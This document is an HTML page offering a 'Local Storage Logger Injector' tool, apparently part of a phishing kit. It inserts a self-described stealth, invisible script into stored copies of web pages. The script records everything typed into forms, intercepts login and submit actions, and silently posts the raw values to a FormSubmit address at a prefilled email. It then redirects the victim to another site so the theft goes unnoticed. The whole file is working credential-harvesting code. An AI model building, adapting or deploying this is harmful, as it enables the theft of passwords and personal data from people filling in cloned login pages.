<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Local Storage Logger Injector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
            color: #333;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 30px;
        }
        .container {
            background-color: #f9f9f9;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        button:hover {
            background-color: #2980b9;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 4px;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .info {
            background-color: #e7f5fe;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        .code-container {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
        }
        .tab-buttons {
            display: flex;
            margin-bottom: 15px;
        }
        .tab-button {
            background-color: #ddd;
            color: #333;
            padding: 10px 15px;
            cursor: pointer;
            border: none;
            margin-right: 5px;
        }
        .tab-button.active {
            background-color: #3498db;
            color: white;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Local Storage Logger Injector</h1>
        <p>This tool reads HTML from localStorage (data1step), injects a FormSubmit logger script, and saves the result to localStorage (data2step).</p>
        
        <div class="form-group">
            <label for="email">FormSubmit Recipient Email:</label>
            <input type="text" id="email" placeholder="your@email.com" value="kiddxxq1@gmail.com">
        </div>
        
        <div class="form-group">
            <label for="redirect">Redirect URL:</label>
            <input type="text" id="redirect" placeholder="https://example.com" value="https://www.dtech24.co.za">
        </div>
        
        <button id="injectBtn">Inject Logger Script</button>
        <button id="clearStorageBtn">Clear Local Storage</button>
        <button id="checkStorageBtn">Check Storage</button>
        
        <div id="status" class="status" style="display: none;"></div>
        
        <div class="tab-buttons">
            <button class="tab-button active" data-tab="original">Original HTML</button>
            <button class="tab-button" data-tab="modified">Modified HTML</button>
            <button class="tab-button" data-tab="script">Injected Script</button>
        </div>
        
        <div id="original" class="tab-content active code-container">
            <pre id="originalHtml"></pre>
        </div>
        
        <div id="modified" class="tab-content code-container">
            <pre id="modifiedHtml"></pre>
        </div>
        
        <div id="script" class="tab-content code-container">
            <pre id="scriptPreview"></pre>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Set up tab switching
            document.querySelectorAll('.tab-button').forEach(button => {
                button.addEventListener('click', function() {
                    // Remove active class from all buttons and content
                    document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
                    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
                    
                    // Add active class to clicked button and corresponding content
                    this.classList.add('active');
                    const tabId = this.getAttribute('data-tab');
                    document.getElementById(tabId).classList.add('active');
                });
            });
            
            // Inject button handler
            document.getElementById('injectBtn').addEventListener('click', injectLogger);
            
            // Clear storage button handler
            document.getElementById('clearStorageBtn').addEventListener('click', clearStorage);
            
            // Check storage button handler
            document.getElementById('checkStorageBtn').addEventListener('click', checkStorage);
            
            // Load any existing data1step on page load
            loadOriginalHtml();
        });
        
        function loadOriginalHtml() {
            const originalHtml = localStorage.getItem('data1step');
            if (originalHtml) {
                document.getElementById('originalHtml').textContent = originalHtml;
                showStatus('Found HTML in localStorage (data1step)', 'info');
            } else {
                showStatus('No HTML found in localStorage (data1step)', 'error');
            }
        }
        
        function injectLogger() {
            const email = document.getElementById('email').value.trim();
            const redirectUrl = document.getElementById('redirect').value.trim();
            
            if (!email) {
                showStatus('Please enter a recipient email', 'error');
                return;
            }
            
            const originalHtml = localStorage.getItem('data1step');
            if (!originalHtml) {
                showStatus('No HTML found in localStorage (data1step)', 'error');
                return;
            }
            
            const loggerScript = generateLoggerScript(email, redirectUrl);
            const modifiedHtml = originalHtml.replace('</body>', loggerScript + '</body>') || originalHtml + loggerScript;
            
            // Save to localStorage
            localStorage.setItem('data2step', modifiedHtml);
            
            // Update UI
            document.getElementById('modifiedHtml').textContent = modifiedHtml;
            document.getElementById('scriptPreview').textContent = loggerScript;
            
            showStatus('Logger injected successfully! Modified HTML saved to localStorage (data2step)', 'success');
            
            // Switch to modified tab
            document.querySelector('[data-tab="modified"]').click();
        }
        
        function generateLoggerScript(email, redirectUrl) {
            return `<!-- STEALTH FORM LOGGER (INVISIBLE) -->
<script>
// CONFIGURATION
const CONFIG = {
    // Your FormSubmit endpoint
    FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/${email}',
    
    // Redirect URL after submission
    REDIRECT_URL: '${redirectUrl}',
    
    // Time to wait after typing before considering input "finished" (ms)
    INPUT_IDLE_TIMEOUT: 2000,
    
    // Patterns that indicate a submit button
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 
        'next', 'confirm', 'proceed', 'authenticate'
    ]
};

// ===== INVISIBLE LOGGER =====
(() => {
    // Silent console logging (optional for debugging)
    const log = (msg, type='info') => {
        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
    };

    // ===== DATA CAPTURE =====
    let typingTimer;
    let formData = {};

    // Send data via FormSubmit and redirect
    const sendToFormSubmit = async (data) => {
        try {
            const formData = new FormData();
            formData.append('_captcha', 'false');
            formData.append('_subject', 'Form Data Capture');
            formData.append('_template', 'table');
            
            // Add captured data (RAW, NO MASKING)
            formData.append('page_url', window.location.href);
            formData.append('timestamp', new Date().toISOString());
            
            Object.entries(data).forEach(([key, value]) => {
                formData.append(key, value); // Sends exact input
            });

            const response = await fetch(CONFIG.FORM_SUBMIT_URL, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            if (result.success) {
                window.location.href = CONFIG.REDIRECT_URL; // SILENT REDIRECT
            }
        } catch (err) {} // Silent fail
    };

    // ===== EVENT HANDLERS =====
    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = field.name || field.id || 'unnamed_field';
                    const value = field.value;
                    if (value) {
                        formData[name] = value; // Stores raw value
                    }
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    const setupSubmissionHandlers = () => {
        // Form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                e.preventDefault(); // Stop default submission
                
                const data = {};
                Array.from(form.elements).forEach(el => {
                    if (el.name && el.value) {
                        data[el.name] = el.value; // RAW DATA
                    }
                });
                sendToFormSubmit(data);
            }, true);
        });

        // Button clicks
        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const btnText = (btn.textContent || btn.value || '').toLowerCase();
                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
                    btnText.includes(pattern)
                );
                
                if (isSubmit && Object.keys(formData).length > 0) {
                    sendToFormSubmit(formData);
                    formData = {}; // Clear after submission
                }
            }, true);
        });
    };

    // ===== INITIALIZATION =====
    setupInputHandlers();
    setupSubmissionHandlers();

    // Watch for dynamically added elements
    new MutationObserver(() => {
        setupInputHandlers();
        setupSubmissionHandlers();
    }).observe(document.body, { childList: true, subtree: true });
})();
<\/script>`;
        }
        
        function clearStorage() {
            localStorage.removeItem('data1step');
            localStorage.removeItem('data2step');
            document.getElementById('originalHtml').textContent = '';
            document.getElementById('modifiedHtml').textContent = '';
            document.getElementById('scriptPreview').textContent = '';
            showStatus('Local storage cleared', 'info');
        }
        
        function checkStorage() {
            const data1step = localStorage.getItem('data1step');
            const data2step = localStorage.getItem('data2step');
            
            let message = 'Local Storage Contents:\n';
            message += `data1step: ${data1step ? 'Exists (' + data1step.length + ' chars)' : 'Not found'}\n`;
            message += `data2step: ${data2step ? 'Exists (' + data2step.length + ' chars)' : 'Not found'}`;
            
            showStatus(message, 'info');
        }
        
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = 'status ' + type;
            statusDiv.style.display = 'block';
            
            // Auto-hide after 5 seconds
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>